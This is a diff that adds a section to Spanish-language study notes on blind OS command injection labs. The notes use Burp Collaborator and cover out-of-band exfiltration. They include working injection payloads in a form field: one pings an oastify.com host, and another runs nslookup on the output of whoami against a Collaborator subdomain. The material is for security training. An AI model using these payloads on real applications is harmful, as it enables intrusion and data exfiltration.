@@ -39,9 +39,18 @@ Para este laboratorio se utilizo el Burp colaborator Client de nueva cuenta la v
 csrf=ItkBikPD69urSsgTDkHVZmvP8g1NiQj8&name=Masa&email=masa%40gmail.com|ping woojq6yqontbtnxg748e0indw42wql.oastify.com||&subject=abcd1234&message=Comment
 ```
 
+# Blind OS command injection with out-of-band data exfiltration
+
+De este laboratorio hay varias cosas a destacar primero se recuerda que hace la herramienta nslookup. Despues se utilizan las comillas invertidas para ejecutar un comando es muy parecido a $() solo que no crea una subshell. para resolver este lab se hizo uso del Burp colaborator y ademas se usa dobel ||
+
+> Muy práctica y fácil de usar, cuya función básica es encontrar la dirección IP de un equipo determinado o realizar una búsqueda DNS inversa (es decir, encontrar el nombre de dominio de una determinada dirección IP).
 
 
+```
 
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+
+```
 
 
 
